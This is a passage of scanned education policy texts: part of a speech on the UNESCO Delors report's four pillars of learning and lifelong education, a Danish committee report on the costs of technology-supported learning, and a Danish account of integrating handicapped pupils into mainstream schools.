the development of a culture of peace. The second theme is the need to maintain social cohesion while favouring individual creativity and bringing out the full potential of each individual. What we are talking about is using education as a means of preserving diversity, of giving each individual the opportunity to learn and develop talents. This implies diversity in both teaching methods and content, diversity in both space and time of learning. At the same time, initial education must introduce an understanding of democratic participation, at an age when young people form their values and their critical judgement. Young people need to learn very early about the practical consequences of the values that underlie democracy and social cohesion. I do not think it is going too far to say that contemporary democracies are facing a dangerous split between political life and private life and behaviour. Thus, education needs to attempt to counteract with this unfortunate disinterest for public service and public policy on the part of many individuals. The third theme is the necessary transition from a simple search for economic growth to that of sustainable development. This preoccupation with making progress serve the dignity of all human beings has been reflected in the major initiatives of the United Nations System: the Rio summit on the environment, the social summit here in Copenhagen, the population summit in Cairo, and the conference on women in Beijing. The concept of sustainable development places human beings at the centre of economic considerations, and so it has major implications for education. A full definition of sustainable development, that includes learning throughout life, can offer new perspectives for the creation of employment. II. Principles and application of educational policies In all its consultations, the Commission observed the profound hopes placed on education. Some of these hopes relate, naturally, to very specific and legitimate functions of education in imparting knowledge and skills; on the other hand, rarely did we encounter a narrow, purely functional view of education. On the contrary, education is a means, both individual and collective, to fostering a more harmonious form of human development. Such a development, as I have already said, should rest on the fundamental dignity of each individual, and reduce poverty, exclusion, ignorance, oppression and war. We, the Commission, have a vision of learning that includes but goes beyond formal education. Learning throughout life, as we have called it, is not merely a slogan intended to encourage access to further training. It is a vision of education that begins with early childhood, and that aims at giving each individual the tools, during initial education, to continue learning and developing throughout life and in all aspects of human activity. Here, I must pay tribute to your countries, where there is a long history of commitment to expanding learning opportunities for all. I am pleased to come here to debate our report before representatives of countries that have a distinguished record of energetic and thoughtful reform, and that strive continuously to make education fulfill its potential for true equality of opportunity. The concept of learning throughout life takes on particular meaning today when patterns of life, and of the use of time, are changing extremely rapidly. The time spent in work over each individual lifetime has diminished by nearly one-third since the beginning of this century, from approximately one hundred thousand hours to seventy thousand. By the year two thousand twenty-five, projections have the number of hours worked in a lifetime down to forty thousand, at a time when life spans are increasing rapidly. Will we be able to propose to our citizens a creative distribution of their vastly increased free time, that includes leisure, community participation, and learning? Will we be able to meet the challenge of inventing and offering new patterns of work, learning and leisure that ensure continuous participation of each individual as a meaningful member of society? These are tremendous challenges for education and for educators. Clearly, they cannot be met by merely extending initial schooling, with its individual successes and failures. Clearly, we must find ways to make sure that the doors to learning Such a task will not be easy. The four pillars of education Keeping in mind the challenges posed by a commitment to human development, the Commission wished to propose a broad definition of the foundations and the aims of education. It proposes that education be constructed around four pillars: learning to live together, learning to know, learning to do, and learning to be. Learning to live together means more than tolerating otherness. It means wishing to understand others, to live together in mutual respect. If we wish, through education, to learn to live together, we must reflect on the way in which history, geography, languages, philosophy are taught. We must examine the way in which the educational establishments themselves function and interact with the community. We must be aware of the importance of the example of teachers, whose function as role models is so important in the transmission of attitudes and values. The second pillar is learning to know. Today, this means more than acquiring a specific body of knowledge. It demands an approach to learning itself, understanding how to master the instruments for using knowledge, and how to exercise one's critical faculties, curiosity, and of course, memory. Learning to do, traditionally separated from "learning to know", is of course not only concerned with the acquisition of skills, but also with the application of knowledge and with a set of competencies that are broadly termed "life skills". It is here that early on, thinkers in the Scandinavian countries, such as Gründtvig, Rüdenschold, and Salomon, to name only these, have shown the way. They, and others in the Nordic countries have constantly sought to link learning with doing. They have emphasized breaking down the barriers between intellectual and practical knowledge, by insisting on the need for all learners to undertake both intellectual and manual activities. In short, they laid the groundwork for belief in the benefits of a rounded education that is very much alive in your countries today. The fourth pillar, learning to be, is the title, and principal theme of the Commission that reported to UNESCO some twenty-five years ago, under the chairmanship of Edgar Faure. This noble concept is just as valid today as when it was coined: learning to be means encouraging the fullest development of the creative potential of each individual, in all its richness and complexity. In the words of one of our commissioners, education is first of all an inner journey, that leads to the construction of one's personality. These four pillars, then, aim to place on equal footing the development of the individual and the individual's place in society. They aim to emphasize the equal importance of the intellectual and the practical, and to break down what can be an excessive separation between the roie of the hand and the role of the mind. And, they should make clear our view that the "inner journey" of education must, to be complete, culminate in an understanding of one's relationship to others, that is in learning to live together. Our report gives great importance to the role of teachers. We felt that rehabilitating the nobility of the teaching profession, by enhancing the status, roles, and training of teachers, will justify the strong demands that a new concept of education will make on them. Yes, the world is changing, and there is no longer a monopoly of the classroom on learning. New media, new methods of communication, new types of learning opportunities - including learning by doing - are broadening the spectrum of learning possibilities. Education establishments and whole systems will have to integrate and take advantage of these new possibilities. However, the teacher will still, in our view, remain central to learning. Nothing will replace the interaction of personalities between learner and teacher: the awakening of curiosity, the testing of ideas or new knowledge, the value of example. And, changes to the overall education system will necessarily demand the consensus and participation of teachers. From basic education to university: What do our four pillars imply for education? They imply rethinking the sequences and time-frames of education. Demand for education is increasing all over the world, including in Europe. Changes in the employment structure make a unique period of initial education less and less adequate as preparation for life. More and more people will change professions several times over their lifetimes, and will alternate periods of paid employment with other types of activity. In view of these changes, what types of adjustments should we foresee in formal education? Although one could make a long catalogue of important issues surrounding the educational responses to the future, I should like to emphasize three areas: - the essential nature of basic education, including in countries with well developed systems; - the need to diversify both the content and the organization of secondary education; and, - the importance of higher education, its relationship to society and to the rest of the educational system. Basic education, understood as the first cycle of education (including early childhood education), is where the attitudes towards learning are developed and where the tools for further learning are forged. UNESCO, along with UNICEF, UNDP and the World Bank, have raised awareness about the importance of expanding schooling to reach those 230 million children who today either never enter a primary school or do not complete the four years that is a minimum to retain the skills of literacy and numeracy. They have focused attention on the almost 900 million adult illiterates, most of them women, who very often remain marginalized because of their lack of basic life skills. They have made us aware of the fact that these 900 million adult illiterates are also those the most at risk of being unable to ensure that their children acquire complete basic education. But, these dramatic problems should not leave us, in Europe, satisfied because all of our children go to school. Many, we have only recently understood, still relapse into a state of functional illiteracy. Others, who may have special needs, get left behind early on, never to catch up, or leave the system prematurely, never to return. Equality of opportunity begins in early childhood, and much remains to be done to ensure it. The foundations of basic education include an emphasis on basic skills, butalso on learning languages, living democracy, working and learning in groups, linking school with the outside world. Secondary education is in many ways the most problematic of the sequences of our systems. It is the place where, today, the fate of many young people is decided. And yet, it is in secondary education that the most varied talents should emerge and flourish. It is crucial to keep constantly in mind the need to encourage diversity, to recognize and nurture all sorts of abilities and talents in young people at this level. In fact, no school system specifically aims to make all young people alike; yet the curricula, and methods of teaching and testing can have the effect of discouraging difference or experimentation. We shall have to increase our efforts to make secondary schooling more open and more diversified. Some young people benefit greatly from periods of work in between periods of formal schooling; others can choose a course of study only to return later to take up another path. Changes in the sequences and in the contents of learning at secondary level should enable us to break down the hierarchy between vocational and academic learning, to give second, third, fourth chances to everyone. Another approach would be trying to break down what can be a strict barrier between professional teachers, and others who can teach about their professions. This latter would, of course, require some negotiation and discussion with leachers' organizations. Higher education, with at its heart the university, is central to the development and spread of knowledge in any society. It has a potent influence on the rest of the system, by educating its teachers and managers, by developing the standards of acquisition of knowledge and excellence that rest of the system aspires to. In our report to the traditional three functions of higher education, that is, research and innovation, teaching and training, and continuing education or community service, we added an emphasis on international co-operation. In all of these four functions, universities will have to be deeply aware of the balance to be found between the pursuit of knowledge and excellence, and their relationship with society. Higher education is called upon to broaden its links with society, and this is perfectly justified. But the Commission would not wish this to be interpreted as a diminishing of the role of universities in carrying out research and in training researchers. These are essential tasks, both for society and for the survival of universities themselves. The links between universities and teacher training institutes needs to be strengthened. Access to higher education must be made freer for those who have not followed a linear path throughout the education system. And, universities must actively pursue one of their original functions, the free circulation of knowledge: it is our institutions of higher education that can provide the impetus for a greater co-operation between wealthy countries and poorer countries, by sharing information, by encouraging exchange, by developing new methods of research and training that can help develop endogenous capacity where it does not adequately exist. III. Human resources in Europe Changing visions of human resources: from human capital to humanizing capital The Commission's analysis and work over three years reinforced our conviction that, whatever the particular set of circumstances in a country or society, education is a priority. Whatever the economic or social difficulties, a long-term commitment to improving access, equity, and quality in education are investments that are essential for preserving the social fabric, for ensuring human dignity, and for economic progress. Let me be clear: we had no intention of trying to establish a correlation between education and unemployment. Massive unemployment in Europe is the product of a set of factors that I outlined in the 1993 White Paper on Growth, Competitiveness and Employment. We must, in Europe, lay down the foundations for higher growth based on higher employment. This should be founded on a new model of development that takes into account key parameters, that is, protection of the environment, broader options for the distribution of time spent working, and also meeting new societal needs, particularly concerning services for people. And yet, in the economic climate of Europe today, it seems that we are losing sight of the long-term advantages on which we must build to preserve the future. We are a highly educated, highly skilled population. We need to preserve those advantages by improving the quality of training and of education, and by ensuring another chance for young people who have left education too early to be successful in the labour market. Indeed, elsewhere, the most successful of the emerging, powerful economies of Asia and Latin America have consistently invested in education over the last few years. To take the discussion one step further in Europe, the European Commission recently brought out a white paper, under the authority of Edith Cresson and Pådraig Flynn, entitled "Teaching and Learning: Towards the Learning Society". Here, as in our report to UNESCO, the paper makes a plea for re-emphasizing the value of a broad general education. It stresses the importance of second chances for young people who leave school prematurely, and it speaks in favour of an education that develops attitudes and capacities that make people apt for the labour market. We are entering into a debate in Europe, on the relative emphasis to be placed on skilled labour and unskilled labour. Many thinkers feel that the future of Europe is in something called "skilled" labour, that is the knowledge-intensive jobs, those carried out by the so-called "symbolic analysts". In such a view, training must emphasize competencies and aptitudes related to skilled work. This is clearly true as far as it goes. However, what sorts of skills can we define in relation to community work, to the service sector, where human relations are as much required as specific skills that are traditionally taught in classes? If we place all our emphasis on high-level skills, what kind of message are we sending those people who, inevitably, will do work that does not require these skills? By placing too much emphasis on the level of formally learned skills needed for work, are we not creating hierarchies that will be socially divisive, even explosive, over time? I think it is time to realize that, the search and need for education is not only a search for marketable skills, that the purpose of seeking to develop a learning society is not only that of providing skills for the economic marketplace. Thus, while the White Paper on growth, competitiveness and employment points to the need for Europe in the future to have an economy that is healthy, open, decentralized, and competitive, it also pleads for solidarity. This solidarity can come through economic measures, but it will also come through equal opportunity in education. It will come through investing in young people and giving each the additional chances that will enable him or her to achieve a rounded education based on the four pillars I have described above. It is thus that the central theme of our report, learning throughout life, takes on its full meaning. Europe must not relax its vigilance. We must respond to increasing demand for education: earlier, longer, and for more people. IV. A look at financing educational reform: a matter of political choice You will be asking yourselves, what will it cost to adapt education systems to this new vision? How can our education budgets, already strained, cope with new demands in terms of quality and quantity? There are, of course, no simple answers, and no single approach will be satisfactory for all situations. One principle is clear, however. Education is a public good that belongs to the whole of society. Thus, it is the whole of society that must benefit from education, and the whole of society that must participate in decisions about the major directions decided for educational policies. In particular, however each country resolves the equilibrium between public and private financing of education, it is essential to remember that choices about education are among the major political choices made by societies. The state has a fundamental responsibility for regulating the system, for trying to ensure the system as a whole offers both equity and excellence. Education systems, from the governmental point of view, are part of the overall vision each nation has of the way in which it ensures the welfare of all its citizens, linking education with the other measures of governments to provide equal opportunity and ensure fundamental human rights to all. Where cost-sharing schemes come into play, whether these be in the form of fees for schooling or higher education, or in opening up possibilities for private education, these must be accompanied by measures that allow for equality of opportunity for those who cannot pay. Much of the rest of the world can learn from your own experience with student loans. The Commission also favours broad decentralization of educational systems, which can encourage innovation, and in many cases more efficient use of public money. Conclusion Choices in education are societal choices and political choices, as I have said. The importance of these choices requires on-going debate: this means first of all, debate in parliaments, but also by local authorities, by citizens, and in educational systems. Although corrections will be needed, I think it important to state that continuous reform is wasteful and can be destructive of creative energy, resources and good will. A process of change that seeks to involve all "stakeholders" in teaching and learning is bound to lay more solid foundations for long-term improvement than "top-down" reform. Debate on education that involves a variety of actors is in itself a teaching and learning process, whereby the learners can also teach, and the teachers can show that they learn. If our report serves to inspire such debate, or at the very least to enrich it, it will have made a large step towards fulfilling the hopes that inspired its writing. I should not leave you without saying another word about international cooperation. The Commission made a number of recommendations concerning the need to intensify international co-operation, to increase funding for education and to increase the share of international aid that goes to education. Globalization, which has been an important theme in my remarks, has created both new tensions ~nd new opportunities. The tensions can only be managed and resolved, and the opportunities seized, if there is a continuing commitment to international co-operation. This commitment, whose fundamental premise is often underlined by the Director-General of UNESCO, is one of a search for enduring peace.

In a global economy, the division of labour is increasingly international, the location of manufacturing and services being determined by quality and competitiveness. At the same time, it is a truism to say that technological development is accelerating at such a pace that most of the technology which will be in use in 10 years' time has yet to be developed. Nevertheless, at least 80 per cent of the present workforce will still be active in the year 2000. The pace of development and the increasing demand for knowledge will require great flexibility on the part of the workforce, as it will have to adapt continually to the demands of changing, or totally new jobs. In order to meet these demands, education will have to become a lifelong process in the future. Our education system - from the primary and lower secondary school (the Folkeskole) to higher education - is first and foremost a coherent set of self-contained educational provisions for young people. Among other things, this is illustrated by the fact t that expenditure on adult education still only accounts for 11.8 per cent of the total education and training budget in Denmark. Be this as it may, educational institutions have increasingly taken on new tasks in relation to new target groups, and in this connection have developed novel teaching methods involving the application of new technologies. If we are to sustain our standard of living in the long term, we must be prepared to increase the pace with which we adopt new technologies. With the introduction of new technology not only in manufacturing but also built into the products themselves, production will both embody more knowledge and and demand greater knowledge. If we are to satisfy the needs that technological development brings with it, the education system must be restructured so that the provision and implementation of lifelong education and training becomes a significant part of its priorities. At the same time, educational institutions must be prepared to engage in technology-supported learning in cooperation with partners outside the traditional education system. New technology-supported learning systems - with their potential for tailoring courses to the needs of the students, for the delivery of courses to the student's home or workplace and at times convenient to the students - will be able to further significant elements of this reorganisation of education to support a flexible, lifelong learning pattern. Furthermore, they will constitute an integral part of overall initial education and training provisions. Economic Trends in the Development of Education and Training In Denmark, education and training accounts for about 7 per cent of GDP and about 26 per cent of public sector operational and investment budgets. As salaries account for just under 80 per cent, the education sector is extremely labour and salary-intensiv salary-intensive compared with most other sectors of society. Given that teacher salaries increase at the same pace as in society at large, costs in the education system - and thus the "price" per student - will increase more rapidly than the costs and prices elsewhere. nufacturing.The reason for this is in part due to the fact that the education sector is comparatively labour-intensive, and in part due to the fact that opportunities for productivity increases are limited, given the current organisational structure of educational provisions. Simply to maintain current educational standards, we shall thus have to pay more for education and training in the future. The committee has calculated that, if student numbers and educational standards remain unchanged, expenditure on education and training at constant prices will increase from approximately 57 billion DKK per annum in 1990 to about 66 billion in the year 2000 merely as a result of salary increases. Total additional expenditure for the ten-year period will be approximately 50 billion DKK. It is open to question whether such "natural buoyancy" in expenditure will be acceptable, or whether demands will be made that educational staff should balance gains in their real remuneration with productivity increases, as is the case with other groups in society. It is also by no means clear whether the education sector with its current organisation of educational provisions will be able to achieve the required productivity gains without an unacceptable reduction in quality. Technology-Supported Learning The committee has chosen to define technology-supported learning as any form of study where the teacher and students are not present on the same premises, and where study is systematically and deliberately supported by technology. The concept furthermore includes forms of study which are supported by technology, leading to changes in the role of the teacher from that of having control over the learning situation to one in which it is the student who assumes responsibility for his studies and the teacher acts as a consultant, as and when the student feels the need for it. Study traditionally takes place at the same time (the timetabled lesson) and in the same place (the classroom). As opposed to this, technology-supported learning may take place at different times and in different places. In addition, technology-supported learning leads to significant changes in teacher and student roles. The committee has, however, emphasised that the courses must have an explicit, pedagogical structure, and that to a certain extent study must be supported by a dialogue between the teacher and the student and/or among the students themselves. Three scenarios Taking as its point of departure typical study situations, three scenarios have been contructed. Together they constitute a framework for technology-supported learning which - in the opinion of the committee - when used individually or in combination, wil will cater for substantial areas of the Danish education system over a ten-year period. The three scenarios are as follows: The time-independent learning model The simultaneously-distributed learning model The independent study model (differentiated learning). For each scenario, calculations have been made which show the economic consequences of that model compared with those of traditional provisions. The costs of both traditional provisions and of the scenarios have been projected on the basis of technology o options and trends as we know them today. At the same time, it is assumed that new technology-supported learning modes are applied rationally and are in everyday, mainstream use. In the scenarios, the assumption is also that the cost-intensive development phase has been completed and that the inevitable "growing pains" are over. In the case of the Time-independent Learning Model, one can combine elements from classroom teaching with the temporal flexibility of the correspondence school. The individual student studies at home or at his place of work, from where there is a continual dialogue with the teacher and with the other students. In Denmark, the distance learning dimension, where students work on their own or in groups, is normally combined with classroom teaching in the form of a limited number of weekend seminars. The model is well-suited to time-independent learning. Weekend seminars aside, it is independent of distance. The time-independent learning model is not, however, particularly flexible when it comes to the starting date and variations in study load during the course. The model makes relatively big demands on the student's maturity, motivation and his ability to work independently. Compared to traditional teaching, the course involves predominantly written rather than oral communication. The time-independent model makes great demands on the planning and pedagogical quality of the course, and highlights the performance of the individual teacher and that of the teacher group. Based on the committee's calculations, the time-independent learning model becomes cheaper than traditional direct teaching with student/teacher ratios of 20 or more, depending on the conditions. The bigger the student/teacher ratio, the greater are the a advantages of the time-independent model. With 100 students, the costs per student for this model are about 31 per cent lower than the costs in a comparable traditional provision. These benefits have not been achieved in experiments to date, all of which have been small-scale, but they will be feasible in the event of a change-over to large-scale, rational and mainstream operations. In the Simultaneously-Distributed Learning Scenario, students can see and hear their teacher. They can also carry on a dialogue with a teacher when studying either individually or in groups. Technically, the model builds on satellite, cable television or on video telephony (video-conferencing). Of the scenarios described, the simultaneously-distributed learning model is the one which is closest to the traditional teaching mode. Therefore, neither the student nor the teacher roles are significantly different from those of traditional provisions. This model requires that teaching takes place at dates and times which have been agreed in advance. The model is good at overcoming the barrier of distance, and it is therefore well-suited when it comes to serving thinly-populated areas with a few, small institutions, where it is difficult to assure reasonable class sizes. By coordinating and combining the teaching of small classes, the range of courses from which the students can choose can be broadened. It is, furthermore, well-suited as a means of promoting specialisation among educational institutions in various parts of the country, and for the education and training of those involved in research. As regards the start and the progression of such a course, the model corresponds to traditional provisions. t an educational institution or at the student's place of work. Given the current situation, it is not economically advantageous for institutions to offer entire courses based on video-conferencing technology. But the use of such technology has economic advantages, if the teaching of small classes is coordinated and combined. As significant reductions in the prices of the hardware used in the model are forecast, the example on which the committee has based its calculations, (an entire higher commercial examination course), will become cheaper than the corresponding traditional provision by the year 2000, if it is implemented in the form of simultaneously-distributed learning, and if the educational standard of the traditional provision remains unchanged. In the last scenario - the Independent Study Model - the student, in principle, works alone with the subject-matter in an organised sequence of modules. The student also works at his own pace, and he must be able to find answers to all his questions in the study package. As the last condition is difficult to fulfill, in practice the model will frequently be supplemented with the option of counsellor support at a study centre. Breakthroughs with regard to videodiscs and CD-ROM technology leading to a rapidly increasing supply of high-quality material for independent study can be expected in the coming years. As the number of units sold in the international market will be high, the price of independent study packages can be expected to drop significantly. In principle, the model can operate with unlimited class quotients. In practice, however, it is often the case in Denmark that independent study materials are used in study situations where there is still a teacher present, and where independent study is combined with traditional teaching. In these delivery modes, the teacher role changes into that of consultant; the teacher becomes a human resource, to whom the students can turn as and when they wish. Even in the last instance, the model is economically advantageous, as the teacher - depending on the quality of the teaching material - can handle larger classes than he would otherwise be able to in traditional provisions, and because the duration of the course can be reduced by about a third. To this should be added that course participants have proved better at coping with their final examinations than the participants in the traditional provisions. The independent study model makes great demands of the autonomy of the students. At the same time, the teacher role is radically different. In this mode, the teacher functions as a counsellor and offers support in connection with the students' acquisition of study skills. In addition to this the teacher will, if necessary, have to put together study units using multimedia materials. The Recommendations of the Commitee Technology-supported modes of learning are well-suited to meet a substantial part of future needs for "lifelong learning". At the same time, technology-supported modes of learning make it possible to maintain and extend the geographical distribution of ed education and training provisions. For these reasons, in conjunction with projected trends for the cost of technology-supported learning compared with traditional provisions, the committee recommends that a coordinated initiative with well-defined objectives should now be implemented with the aim of extending technology-supported learning provisions in Denmark. 1. All interested parties within and outside the public education system should have the opportunity of participating actively in the development of technology-supported learning provisions, including provisions leading to formal educational qualification qualifications. In this connection,existing education and training monopolies should be abolished, and all citizens should be given the right to present themselves for publicly recognised examinations, even though they are not enrolled in a course at an educational institution. Public study grants linked to a unit/credit scheme do not seem to constitute an obstacle to a liberalisation which is both characterised by competition and which, at the same time, maintains quality criteria in the form of examinations. There will also be significant opportunities for fruitful cooperation between educational technology specialists, adult and further education, and traditional educational institutions. Such cooperation will increase the pace at which professional expertise in the use of technology support modes of learning is acquired by those offering full-time courses of education. 2. An in-service continuing training programme should be initiated for both teachers and administrative staff who are to take part in the organisation and implementation of technology-supported learning. This programme should be of a temporary nature until existing teacher training provisions have been able to integrate the necessary skills required to offer technology-supported learning programmes. The in-service programme should aim to train a sufficient number of staff in order to establish a core of expertise at the institutions involved; the committee envisages something of the order of 15-20 per cent of the teaching profession taking part in such a course. In the first phase, the target group should be schools of vocational education and training, and institutions of higher education. The breadth of the course should be such that it gives an understanding of all the scenarios which have been described in this report, and the course organisation must include practical exercises. The course should be technology-supported in part, so that the course participants have the opportunity to gain first-experience of these study modes. Furthermore, the course should be organised so that it caters for all categories of teachers. The development of the course should involve both companies and organisations with experience in technology-supported learning and educational institutions with well-documented expertise in the pedagogical in-service training of the target groups in question.At the same time, existing teacher training programmes and a number courses in administration should be reorganised so that in initial education and training provisions it becomes possible to acquire professional competence within the area of "organisation of technology-supported learning". 3. Funds should be earmarked from public building and equipment appropriations for full or partial grants for the purchase of equipment for technology-supported learning. Such grants should only be made for initial purchases. 4. A joint national data network should be used which institutions can join for a limited period of time free of charge, and which provides a series of specific services, including the operation of a conference system or other kinds of electronic systems which facilitate network cooperation among several users. The service should be supported by a unit responsible for service and maintenance,upon which the participating institutions can draw. The operation of the network should be supported by public funds. Support should also be given to students' use inasmuch as they should only have to call the nearest network node and thus pay the local telephone rate. 5. Legislation pertaining to radio and television should allow for the use of the public broadcasting network for the transmission of educational programmes and data. In addition, the possibility of educational institutions or the Electronic University (see below) using the broadcasting network and retaining intellectual rights to the educational materials themselves should be investigated. 6. A national service centre for the development of technology-supported learning should be established. In order to guard against the development of an organisation with its own institutional interests, the committee envisages a small organisation along the lines of the Danish Research Academy which could act as a dynamo and function as a source of inspiration. The committee makes the assumption that a considerable part of the tasks will be delegated to the education system. In addition, the centre will be given tasks relating to the drawing up of development contracts, course schedule monitoring, the acquisition of national licences, the importation of foreign teaching materials, copyright issues and the like. Consideration should be given to the question of letting the centre be responsible for the dissemination of information about, and the organisation of, distance education provisions,in particular those forms corresponding to the time-independent learning model. In this connection, the centre should be entitled to receive government "taximeter" grants (i.e. grants per enrolled student) and subsequently settle accounts with the participating institutions on the basis of contracts entered into.The centre should have a life of ten years. Before this period expires, the future of the centre should be assessed with a view to either closing it down or changing its terms of reference and maintaining it in a scaled down form. We propose that the centre be called "the Electronic University". 7. Partial or total funding should be made available for the adaptation of a number of traditional courses to include technology-based learning. There should be a broad range of courses organised in this way, to cater for those who would no doubt prefer this learning mode, if it were generally available. The aim of supporting such developments, possibly in the form of co-financing agreements, should be to ensure the creation of a broad and coherent educational provision within a period of a few years. This would also enable institutions to offer a wide and varied range of education and training, in particular in the field of formal, vocationally-oriented adult and further education in geographical areas where their location makes it difficult to offer traditional courses.

Introduction In May 1969, the Danish parliament, the Folketing, passed a resolution about a reform of thebasic school system (9-point programme), which included a statement to the effect "that theinstruction of handicapped pupils shall be extended in such a way that the children canreceive instruction in a normal school environment if the parents so wish and can care for thechild at home, and if commitment to an institution is not a necessary part of the treatment".Now, 20 years after the resolution, it is possible to evaluate the reform and describe to whatextent, under what conditions and in what way the integration of the handicapped pupils inthe mainstream school has developed. 2. The Situation prior to 1969 Before 1969, many children with severe handicaps were referred to institutions under thespecial care service, and those enrolled in the Folkeskole often attended separate schools.The influence of the parents on these decisions of segregation was very limited; indeed, thelegislation for handicapped persons required that children with special handicaps - e.gblindness - should be referred to special institutions, sometimes far away from their homes.Already in the early 60s, a group of parents and educationalists protested against thissituation - a protest that evoked response from the Ministry of Education and many localschool authorities. The resolution of the Folketing, therefore, can be viewed as clear politicalsupport to an ongoing development towards a Folkeskole more accommodating to thehandicapped. 3. The Incipient Integration The first major attempt to comply with the integration wishes was the establishment of theCounty education centres in the 60s and early 70s. These centres consisted of specialclasses placed at the ordinary schools, and many children with more severe handicaps suchas visual, hearing and motor disabilities, who would otherwise have been segregated intospecial care, were enrolled here. At the same time the municipal schools became very cautious referring blind children to thecountry's only school for blind persons: the Refsnæsskolen at Kalundborg. Due to their smallnumber, these children could not be gathered together in special classes and were thereforeenrolled separately in ordinary classes. Something similar happened to many motorhandicapped pupils. It soon appeared that both centre class and individual integration were feasible andappropriate solutions, provided that adequate professional and financial resources wereavailable. Consultant arrangements were set up, according to which teachers with specialknowledge - often acquired during employment in institutions for handicapped - offeredadvice to staff from the mainstream schools. Concurrently, the special institutions undertookto make courses, materials, observation and relief periods etc. available to local schoolauthorities. These initiatives prove that it is not always necessary to bring the client to the expert but thatit is feasible too to bring the expertise to where the user is. 4. Developments in the 70s Throughout the 70s, fewer and fewer children from the Folkeskole were being segregatedinto special schools but were placed either in special classes in ordinary schools or directlyinto ordinary classes, where the support of a specially trained teacher was made available forlonger or shorter periods of the teaching time. An increasing number of children and youths from the special care school system receivedoffers of schooling, and in the late 70s practically all severely handicapped children receivedinstruction. When, in 1980, the instruction of the special care service was transferred to the framework ofthe Folkeskole, it had become widely understood and accepted that all children can receiveinstruction, hence are entitled to instruction; which, of course, must be adapted to thequalifications, the possibilities and the needs of the individual pupil. The idea that the Folkeskole must accommodate all children represents a challenge, whichhas clearly, in a positive sense, left its mark on the work with this group of children. 5. The Development of Special Education Since the 60s, increasing attention has been paid to pupils in the Folkeskole who could notderive adequate benefit from the ordinary instruction. The efforts of the Folkeskole have reflected a still stronger wish to offer to all pupils theopportunity of optimum development; however, as this objective seems difficult to fulfil foreverybody within the scope of ordinary teaching, this task has, in certain cases, beenentrusted to special instruction provision. In the process, a much larger number of pupils hasbeen referred to special instruction than was expected 20 years ago. Concurrently, there hasbeen a corresponding growth in the resources spent on special instruction by the Folkeskole.This development was especially marked up through the 70s, when the number of pupils andthe consumption of resources practically doubled whereas, in the 80s, developments havebeen stagnant. 6. The Present Situation in Figures By the end of the 80s, approx. 80,000 - or 12-13 per cent - of the pupils in the Folkeskole werereferred to special instruction for shorter or longer periods of a school year. The mainproblem of approx. two thirds of these pupils has been to follow the instruction, in Danish inparticular, but also in Arithmetic and English. The rest is distributed equally on pupils withphysical functioning difficulties (speech impairment, hearing, visual or motor disabilities),pupils with general learning difficulties (mentally retarded) and pupils with behaviouralproblems. The referral rate varies considerably from area to area, being for instance approx. twice ashigh in the Copenhagen area (17.5 per cent in the Copenhagen County) as in West Jutland (8.75%in Ringkøbing County). These differences can hardly be accounted for by differences in thepopulation of children but must also be ascribed to varying levels of tolerance and ambitionof the general teaching provision as well as to the local social environments.However, it ischaracteristic of the development that even though the number of pupils in special educationhas grown substantially, physical segregation has been used to a still lesser degree. It is alsocharacteristic that the increase, to a large extent, refers to children with reading problems,and that these children normally are not segregated from the class but receive specialeducational support in a limited number of the weekly lessons, in reading groups, in readingcourses or in a reading clinic. It should be added, however, that also the number of pupils with social behavioural problemshas been on the upgrade, and that the nature of their problems has become more severe andthus more difficult to handle within the framework of the ordinary school. 7. Integration On the whole, the situation as regards the special instruction of the Folkeskole reflects aremarkably high level of integration. Out of the approx. 80,000 pupils referred annually tospecial instruction, almost 70,000 - or roughly 80 per cent of those referred - receive the specialsupport as a - relatively limited - supplement to the instruction in the ordinary class. Of theroughly 10,000 pupils who are referred to special instruction without affiliation to an ordinaryclass, roughly 6,000 attend special classes at ordinary schools, while only the remaining4,000 pupils attend special schools. This means that only approx. 0.5 per cent of the pupils of the Folkeskole are now taught outside anordinary school environment. We have reason to be proud of this development, which is indeed highlighted by the keeninterest shown by other countries in our system of special education. In May of 1990 the education ministers of the EC adopted a resolution concerning integrationof handicapped children and adolescents in the ordinary education systems. It is worthnoting that Denmark, already at this point, has gone a long way towards the fulfilment ofthese intentions. 8. Other Areas of Education Over a long period of time, also the private schools - where roughly 10 per cent of all children in thecompulsory school age are taught - have admitted a growing number of handicapped pupils.At these schools all special instruction is organized within the framework of the generalteaching; thus the handicapped pupils are fully integrated. This also applies to the approx.250 pupils with more severe handicaps who attend private schools. Likewise, the youth education courses and the associated supplementary and adult trainingcourses are open to students with functional difficulties; and both the upper-secondary schooland the vocational training courses offer special educational support to students withfunctional impairment who, given the necessary compensatory measures, will be able tocomplete the course. In any case, full integration exists in this area, as there is no specialprovision at this level. In the school year 88/89, approx. 200 students received special educational support in upper-secondary school and approx. 3,000 in vocational education and training. In further and higher education, likewise, the intake of students with handicaps, primarily inthe form of a physical or sensory functional impairment, is growing. This development hasbeen facilitated through improvement of the physical environment at the educationalinstitutions, modern interpretation equipment for the deaf, taped textbooks and use of newtechnology. Furthermore, in a number of cases, exemption has been granted from theadmission requirements in the enrolment of students with handicaps. 9. Prerequisites of the Integration When the trend towards added integration of children with handicaps in the ordinary schoolarose and developed in the late 60s, the strongest motive most likely was parent wishescoupled with pedagogical theories about the positive aspects of integration.Segregation into an institution of special instruction often means a long way to school orperhaps even round-the-clock removal from home. This will often alienate the child inrelation to other children in the home neighbourhood; and the general view of the parentsoften is that although it is, indeed, valuable for their child at the institution to have theopportunity of acquiring exact knowledge and skills at its own level, it is, at the same time,something negative that the child does not learn to associate with the other children in anordinary school environment. How are these children supposed to adapt, as adults, to a lifein society if they have spent most of their childhood in a special environment with friends justas deviant as they are? This attitude was supported by many educationists who added - perhaps a little audaciouslyin the tradition of the day - how will the ordinary pupils in the school ever learn to associatewith fellow human beings with handicaps if their entire school career has been devoid of allthose who behave or function somewhat differently from they themselves?In addition, pedagogical research indicated that handicapped children developed better, bothsocially and in respect of learning, in an ordinary heterogeneous school environment than ina more homogeneous institution. 20-25 years' experience has shown that the situation is not quite that simple, i.a. becauseboth children and parents, teachers and school environments are different. Thus we nowknow, that integration is not just omission of segregation. It also involves adaptation of theordinary school environment so as to cater to the development of the impaired pupil, forinstance by providing such special educational support as each individual impaired pupilneeds. 10. Choice of Teaching It has, no doubt, furthered the integration process that integration/segregation was and is notan either-or choice between a separate school of special instruction and an ordinary schoolwithout special means of support, as is still the case in many other countries. Between theseextremes the Danish school can offer a wide range of possibilities, which can be described,in relation to each other, as more or less integrated, which will primarily ensure, however,that the needs of the individual pupil can be met, and school and parents have real options.This flexibility is at the same time a condition for and a consequence of the fact that thespecial needs of a functionally impaired pupil are assessed quite individually without takingaccount of general diagnoses or standardized test results. Referral to special education is adecision that is made separately, in each case, after an evaluation has been 